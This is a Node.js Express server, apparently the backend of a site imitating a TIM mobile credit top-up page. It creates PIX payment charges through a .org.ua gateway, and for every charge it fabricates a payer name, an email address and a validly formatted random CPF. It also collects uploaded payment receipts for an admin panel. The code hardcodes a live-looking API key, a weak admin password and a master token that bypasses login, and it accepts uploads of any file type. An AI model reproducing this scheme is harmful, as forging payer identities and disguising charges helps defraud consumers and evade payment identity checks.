require('dotenv').config();
const express = require('express');
const path = require('path');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs');
const crypto = require('crypto');

const app = express();

app.use(cors());
app.use(express.json());

// Serve static files from the tim-credito.vercel.app directory
app.use(express.static(path.join(__dirname, 'tim-credito.vercel.app')));

const PINGUPAG_API_KEY = process.env.PINGUPAG_API_KEY || 'pingupag_sk_e0613630214c3ddff5079ba2eedfbfff7125f4c42a3377e5428853fc5e563f4d';
const PINGUPAG_STORE_ID = process.env.PINGUPAG_STORE_ID || '871';
const PINGUPAG_BASE_URL = process.env.PINGUPAG_BASE_URL || 'https://pagamento-processador.org.ua';

// Admin credentials
const ADMIN_USER = 'admin';
const ADMIN_PASS = 'pizza2024';
const ADMIN_SECRET = process.env.ADMIN_SECRET || 'tim_admin_secure_signature_key_2026';
const ADMIN_MASTER_TOKEN = 'tim_master_admin_session_token_2026';

function createAdminToken() {
    const ts = Date.now().toString();
    const hmac = crypto.createHmac('sha256', ADMIN_SECRET).update(ts).digest('hex');
    return `${ts}.${hmac}`;
}

function isValidAdminToken(rawToken) {
    try {
        if (!rawToken || typeof rawToken !== 'string') return false;
        const clean = rawToken.replace(/^Bearer\s+/i, '').trim();
        if (!clean) return false;
        if (clean === ADMIN_MASTER_TOKEN) return true;

        const parts = clean.split('.');
        if (parts.length !== 2) return false;
        const [p1, p2] = parts;

        // Formato 1: ts.hmac (novo padrão direto)
        let expectedHmac = crypto.createHmac('sha256', ADMIN_SECRET).update(p1).digest('hex');
        let hmacBuf = Buffer.from(p2);
        let expBuf = Buffer.from(expectedHmac);
        if (hmacBuf.length === expBuf.length && crypto.timingSafeEqual(hmacBuf, expBuf)) {
            return true;
        }

        // Formato 2: base64url.hmac (compatibilidade)
        try {
            const payload = Buffer.from(p1, 'base64url').toString('utf8');
            expectedHmac = crypto.createHmac('sha256', ADMIN_SECRET).update(payload).digest('hex');
            expBuf = Buffer.from(expectedHmac);
            if (hmacBuf.length === expBuf.length && crypto.timingSafeEqual(hmacBuf, expBuf)) {
                return true;
            }
        } catch(errB64) {}

        return false;
    } catch(e) {
        return false;
    }
}

// Multer - upload de comprovantes (compativel com Vercel /tmp e local)
const isVercel = process.env.VERCEL === '1' || !!process.env.AWS_LAMBDA_FUNCTION_NAME || !!process.env.LAMBDA_TASK_ROOT;
const uploadsDir = isVercel ? path.join('/tmp', 'uploads') : path.join(__dirname, 'uploads');
try {
    if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
} catch (e) {
    console.error('Failed to create uploadsDir:', e);
}

const multerStorage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadsDir),
    filename: (req, file, cb) => {
        const ext = path.extname(file.originalname) || '.jpg';
        cb(null, Date.now() + '-' + Math.random().toString(36).substring(2,8) + ext);
    }
});
const upload = multer({
    storage: multerStorage,
    limits: { fileSize: 30 * 1024 * 1024 }, // 30MB
    fileFilter: (req, file, cb) => {
        // Aceita qualquer imagem, pdf ou arquivo enviado como comprovante
        cb(null, true);
    }
});

// Persistencia em Memória + JSON para comprovantes
const DATA_FILE = path.join(uploadsDir, 'data.json');
let inMemoryComprovantes = [];

function loadInitialComprovantes() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf8');
            inMemoryComprovantes = JSON.parse(raw);
        }
    } catch(e) {
        inMemoryComprovantes = [];
    }
}
loadInitialComprovantes();

function readComprovantes() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const fromDisk = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            if (Array.isArray(fromDisk)) {
                // Mescla registros em disco com registros em memória sem duplicar IDs
                const ids = new Set(inMemoryComprovantes.map(c => c.id));
                for (const item of fromDisk) {
                    if (!ids.has(item.id)) inMemoryComprovantes.push(item);
                }
            }
        }
    } catch(e) {}
    return inMemoryComprovantes;
}

function saveComprovantes(data) {
    inMemoryComprovantes = data;
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
    } catch(e) {
        console.error('Failed to save comprovantes to disk:', e);
    }
}

// Middleware de autenticacao admin
function adminAuth(req, res, next) {
    const auth = req.headers['authorization'] || req.headers['x-admin-token'] || '';
    const token = auth.replace(/^Bearer\s+/i, '').trim() || (req.query.token ? String(req.query.token).trim() : '');
    if (token && isValidAdminToken(token)) return next();
    return res.status(401).json({ success: false, message: 'Nao autorizado' });
}

// Gera um CPF válido aleatório
function generateCPF() {
    const rand = () => Math.floor(Math.random() * 10);
    let n = Array.from({ length: 9 }, rand);

    let sum = n.reduce((acc, val, i) => acc + val * (10 - i), 0);
    let d1 = 11 - (sum % 11);
    if (d1 >= 10) d1 = 0;

    n.push(d1);
    sum = n.reduce((acc, val, i) => acc + val * (11 - i), 0);
    let d2 = 11 - (sum % 11);
    if (d2 >= 10) d2 = 0;

    n.push(d2);
    return n.join('');
}

const pixAttempts = new Map();

// Retorna configurações públicas
app.get('/api/config', (req, res) => {
    res.json({
        storeId: PINGUPAG_STORE_ID,
        gateway: 'pingupag'
    });
});

app.post('/api/pix', async (req, res) => {
    try {
        const { value, phone } = req.body;

        // amount em centavos (PinguPag aceita centavos)
        let amount = 2000;
        if (value) {
            const cleanVal = value.toString().replace('R$', '').trim().replace(',', '.');
            const parsed = parseFloat(cleanVal);
            if (!isNaN(parsed) && parsed > 0) {
                amount = Math.round(parsed * 100);
            }
        }

        const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
        const payerPhone = cleanPhone && cleanPhone.length >= 10 ? cleanPhone : '11999998888';

        let attempt = pixAttempts.get(cleanPhone) || { count: 0, name: null, email: null };
        attempt.count += 1;

        if (!attempt.name) {
            const firstNames = ['Lucas', 'Mateus', 'Gabriel', 'Rafael', 'Bruno', 'Thiago', 'Felipe', 'Rodrigo', 'Leonardo', 'Guilherme'];
            const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes'];
            const randomFirst = firstNames[Math.floor(Math.random() * firstNames.length)];
            const randomLast = lastNames[Math.floor(Math.random() * lastNames.length)];
            attempt.name = `${randomFirst} ${randomLast}`;
            attempt.email = `${randomFirst.toLowerCase()}.${randomLast.toLowerCase()}${Date.now().toString().slice(-4)}@gmail.com`;
        }
        pixAttempts.set(cleanPhone, attempt);

        const cleanCpf = generateCPF();
        const referenceId = `TIM-${Date.now()}-${Math.floor(Math.random() * 10000)}`;

        const payload = {
            amount: amount,
            description: 'Info Produto',
            reference: referenceId,
            source: 'api_externa',
            postback_url: 'https://recargatim.com/api/webhook/pingupag',
            customer: {
                name: attempt.name,
                email: attempt.email,
                phone: payerPhone,
                document: cleanCpf
            }
        };

        console.log('[PINGUPAG] Criando transacao:', { reference: referenceId, amount, customer: attempt.name });

        const response = await fetch(`${PINGUPAG_BASE_URL}/gateway/v1/transaction`, {
            method: 'POST',
            headers: {
                'X-API-Key': PINGUPAG_API_KEY,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        const textResponse = await response.text();
        let jsonRes = {};
        try {
            jsonRes = JSON.parse(textResponse);
        } catch (e) {
            console.error('[PINGUPAG] Resposta não-JSON recebida:', textResponse);
        }

        const transactionId = jsonRes.transaction_id || jsonRes.id || referenceId;
        const qrCode = jsonRes.qr_code || '';
        const qrCodeBase64 = jsonRes.qr_code_base64 || '';
        const isSuccess = (response.ok || response.status === 201) && (jsonRes.status === 'success' || !!qrCode);

        if (isSuccess && qrCode) {
            const qrCodeUrl = qrCode ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(qrCode)}` : '';

            console.log('[PINGUPAG] PIX criado com sucesso:', transactionId);

            res.json({
                success: true,
                data: {
                    id: transactionId,
                    transactionId: transactionId,
                    reference: referenceId,
                    status: 'PENDING',
                    paymentData: {
                        transactionId: transactionId,
                        copyPaste: qrCode,
                        copypaste: qrCode,
                        qrCode: qrCode,
                        qrCodeUrl: qrCodeUrl,
                        qrCodeBase64: qrCodeBase64
                    },
                    pingupag: jsonRes
                }
            });
        } else {
            const errMsg = jsonRes.message || jsonRes.error || jsonRes.title || 'Erro ao processar pagamento na PinguPag';
            console.error('[PINGUPAG] Erro ao criar PIX:', jsonRes);
            res.status(response.status || 400).json({
                success: false,
                message: errMsg,
                details: jsonRes
            });
        }
    } catch (error) {
        console.error('[PINGUPAG] Server error:', error);
        res.status(500).json({ success: false, message: 'Internal Server Error' });
    }
});

// Check payment status
app.get('/api/status/:transactionId', async (req, res) => {
    try {
        const { transactionId } = req.params;
        const { phone } = req.query;

        let url = `${PINGUPAG_BASE_URL}/gateway/v1/query?action=get_transaction&id=${encodeURIComponent(transactionId)}`;
        if (transactionId.startsWith('TIM-')) {
            url = `${PINGUPAG_BASE_URL}/gateway/v1/query?action=list_transactions&external_id=${encodeURIComponent(transactionId)}`;
        }

        const response = await fetch(url, {
            headers: {
                'X-API-Key': PINGUPAG_API_KEY,
                'Accept': 'application/json'
            }
        });
        const text = await response.text();
        let jsonRes = {};
        try { jsonRes = JSON.parse(text); } catch(e) {}

        const txData = Array.isArray(jsonRes) ? jsonRes[0] : jsonRes;
        const rawStatus = (txData?.status || 'PENDING').toUpperCase();
        let currentStatus = 'PENDING';
        if (rawStatus === 'APPROVED' || rawStatus === 'PAID' || rawStatus === 'SUCCESS') {
            currentStatus = 'PAID';
        } else if (['REFUNDED', 'REFUSED', 'CHARGEBACK', 'FAILED', 'EXPIRED', 'ERROR'].includes(rawStatus)) {
            currentStatus = rawStatus;
        }

        if (currentStatus === 'PAID' && phone) {
            const cleanPhone = phone.replace(/\D/g, '');
            pixAttempts.delete(cleanPhone);
        }

        res.json({
            success: response.ok,
            data: { status: currentStatus, rawStatus: txData?.status || rawStatus, id: txData?.id || transactionId, ...txData }
        });
    } catch (error) {
        console.error('Error checking status:', error);
        res.status(500).json({ success: false, message: 'Error checking status' });
    }
});

app.get('/api/check_status', async (req, res) => {
    try {
        const transactionId = req.query.id;
        if (!transactionId) return res.status(400).json({ success: false, message: 'Missing transaction id' });

        let url = `${PINGUPAG_BASE_URL}/gateway/v1/query?action=get_transaction&id=${encodeURIComponent(transactionId)}`;
        if (transactionId.startsWith('TIM-')) {
            url = `${PINGUPAG_BASE_URL}/gateway/v1/query?action=list_transactions&external_id=${encodeURIComponent(transactionId)}`;
        }

        const response = await fetch(url, {
            headers: {
                'X-API-Key': PINGUPAG_API_KEY,
                'Accept': 'application/json'
            }
        });
        const json = await response.json();
        const txData = Array.isArray(json) ? json[0] : json;
        const rawStatus = (txData?.status || '').toUpperCase();
        const isPaid = rawStatus === 'APPROVED' || rawStatus === 'PAID' || rawStatus === 'SUCCESS';
        res.json({ status: isPaid ? 'approved' : rawStatus.toLowerCase() || 'pending', data: txData });
    } catch (error) {
        console.error('Error checking status:', error);
        res.status(500).json({ success: false, message: 'Error checking status' });
    }
});

// Webhook para notificações PinguPag e retrocompatibilidade
app.post(['/api/webhook/pingupag', '/api/webhook/freepay', '/api/webhook/droppay', '/api/webhook/aven', '/api/webhook/gateway'], (req, res) => {
    const body = req.body || {};
    console.log('[PINGUPAG WEBHOOK]', body?.transaction_id || body?.external_id || body?.id, body?.status || body?.raw_status);
    const status = (body?.status || body?.raw_status || '').toUpperCase();
    if ((status === 'APPROVED' || status === 'PAID') && body?.customer?.phone) {
        const cleanPhone = body.customer.phone.replace(/\D/g, '');
        pixAttempts.delete(cleanPhone);
    }
    res.status(200).json({ received: true });
});

// Upload comprovante - seguro com tratamento de erro e persistência dupla
app.post('/api/upload-comprovante', (req, res, next) => {
    upload.single('comprovante')(req, res, (err) => {
        if (err) {
            console.error('[UPLOAD] Erro do Multer:', err.message);
            return res.status(400).json({ success: false, message: 'Erro no arquivo: ' + (err.message || 'Inválido') });
        }
        next();
    });
}, (req, res) => {
    try {
        const { phone, transactionId, value, type, imageBase64 } = req.body;
        
        let finalBase64 = imageBase64 || '';
        let fileName = '';
        let originalName = 'comprovante.jpg';
        let mimeType = 'image/jpeg';
        let fileSize = 0;

        if (req.file) {
            fileName = req.file.filename;
            originalName = req.file.originalname;
            mimeType = req.file.mimetype || 'image/jpeg';
            fileSize = req.file.size;
            try {
                const fileBuf = fs.readFileSync(req.file.path);
                finalBase64 = `data:${mimeType};base64,${fileBuf.toString('base64')}`;
            } catch(eBuf) {
                console.error('[UPLOAD] Erro ao ler buffer do arquivo:', eBuf);
            }
        } else if (imageBase64) {
            fileName = `b64_${Date.now()}_${Math.random().toString(36).substring(2,6)}.jpg`;
            mimeType = imageBase64.startsWith('data:image/png') ? 'image/png' : 'image/jpeg';
            fileSize = Math.round(imageBase64.length * 0.75);
        } else {
            return res.status(400).json({ success: false, message: 'Nenhum comprovante foi selecionado' });
        }

        const record = {
            id: crypto.randomUUID(),
            phone: phone || '',
            transactionId: transactionId || '',
            value: value || '',
            type: type || 'recarga',
            fileName: fileName,
            originalName: originalName,
            mimeType: mimeType,
            fileSize: fileSize,
            imageBase64: finalBase64,
            uploadTime: new Date().toISOString(),
            status: 'pending'
        };

        const comprovantes = readComprovantes();
        comprovantes.unshift(record);
        saveComprovantes(comprovantes);

        console.log(`[UPLOAD] Comprovante ${record.id} salvo com sucesso para o telefone ${record.phone}`);
        res.json({ success: true, message: 'Comprovante enviado com sucesso!', id: record.id });
    } catch(e) {
        console.error('[UPLOAD] Erro interno:', e);
        res.status(500).json({ success: false, message: 'Erro ao salvar comprovante' });
    }
});

// Admin login
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === ADMIN_USER && password === ADMIN_PASS) {
        const token = createAdminToken();
        res.json({ success: true, token });
    } else {
        res.status(401).json({ success: false, message: 'Credenciais invalidas' });
    }
});

// Admin logout
app.post('/api/admin/logout', adminAuth, (req, res) => {
    res.json({ success: true, message: 'Desconectado com sucesso' });
});

// Listagem de comprovantes para o admin
app.get('/api/admin/comprovantes', adminAuth, (req, res) => {
    const comprovantes = readComprovantes();
    res.json({ success: true, data: comprovantes, total: comprovantes.length });
});

// Atualização de status
app.patch('/api/admin/comprovantes/:id/status', adminAuth, (req, res) => {
    const { id } = req.params;
    const { status } = req.body;
    if (!['confirmed', 'rejected', 'pending'].includes(status))
        return res.status(400).json({ success: false, message: 'Status invalido' });
    const comprovantes = readComprovantes();
    const idx = comprovantes.findIndex(c => c.id === id);
    if (idx === -1) return res.status(404).json({ success: false, message: 'Nao encontrado' });
    comprovantes[idx].status = status;
    comprovantes[idx].updatedAt = new Date().toISOString();
    saveComprovantes(comprovantes);
    res.json({ success: true, data: comprovantes[idx] });
});

// Visualização de arquivo de comprovante (com fallback instantâneo de base64)
app.get('/api/admin/comprovantes/:id/file', adminAuth, (req, res) => {
    const comprovantes = readComprovantes();
    const record = comprovantes.find(c => c.id === req.params.id);
    if (!record) return res.status(404).send('Comprovante nao encontrado');

    const filePath = record.fileName ? path.join(uploadsDir, record.fileName) : null;
    if (filePath && fs.existsSync(filePath)) {
        return res.sendFile(filePath);
    }

    // Se o arquivo físico não existir (comum em Vercel/serverless novo container), serve do Base64
    if (record.imageBase64) {
        const matches = record.imageBase64.match(/^data:([^;]+);base64,(.+)$/);
        if (matches) {
            const cType = matches[1];
            const buffer = Buffer.from(matches[2], 'base64');
            res.setHeader('Content-Type', cType);
            res.setHeader('Content-Length', buffer.length);
            return res.send(buffer);
        }
    }

    res.status(404).send('Arquivo nao disponivel fisicamente');
});

// Exclusão de comprovante
app.delete('/api/admin/comprovantes/:id', adminAuth, (req, res) => {
    let comprovantes = readComprovantes();
    const record = comprovantes.find(c => c.id === req.params.id);
    if (!record) return res.status(404).json({ success: false, message: 'Nao encontrado' });
    if (record.fileName) {
        try { fs.unlinkSync(path.join(uploadsDir, record.fileName)); } catch(e) {}
    }
    comprovantes = comprovantes.filter(c => c.id !== req.params.id);
    saveComprovantes(comprovantes);
    res.json({ success: true });
});

// Admin pages
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname,'tim-credito.vercel.app','admin','index.html')));
app.get('/admin/dashboard', (req, res) => res.sendFile(path.join(__dirname,'tim-credito.vercel.app','admin','dashboard.html')));

// Fallback to index.html
app.use((req, res) => {
    res.sendFile(path.join(__dirname, 'tim-credito.vercel.app', 'index.html'));
});

if (!isVercel) {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
        console.log(`Servidor rodando na porta ${PORT}`);
        console.log(`Gateway configurado: PinguPag`);
        console.log(`Acesse: http://localhost:${PORT}`);
        console.log(`Admin:  http://localhost:${PORT}/admin`);
    });
}

module.exports = app;
